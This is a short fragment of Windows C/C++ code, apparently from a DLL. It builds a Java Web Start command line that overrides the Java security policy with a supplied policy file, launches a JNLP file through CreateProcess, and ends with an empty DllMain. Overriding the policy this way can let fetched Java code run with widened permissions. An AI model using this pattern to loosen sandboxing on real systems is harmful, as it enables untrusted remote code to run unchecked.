	wcscat(strCmdLine, L" -J-Djava.security.policy=file:\""); wcscat(strCmdLine, strJavaPolicyFile); wcscat(strCmdLine, L"\"");
	wcscat(strCmdLine, L" \""); wcscat(strCmdLine, strJnlpFile); wcscat(strCmdLine, L"\"");

	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	CreateProcess(strJavaWSPath, strCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return TRUE;
}


#ifndef _DEBUG
BOOL WINAPI DllMain(
  _In_  HINSTANCE hinstDLL,
  _In_  DWORD fdwReason,
  _In_  LPVOID lpvReserved)
{
	return TRUE;
}
#endif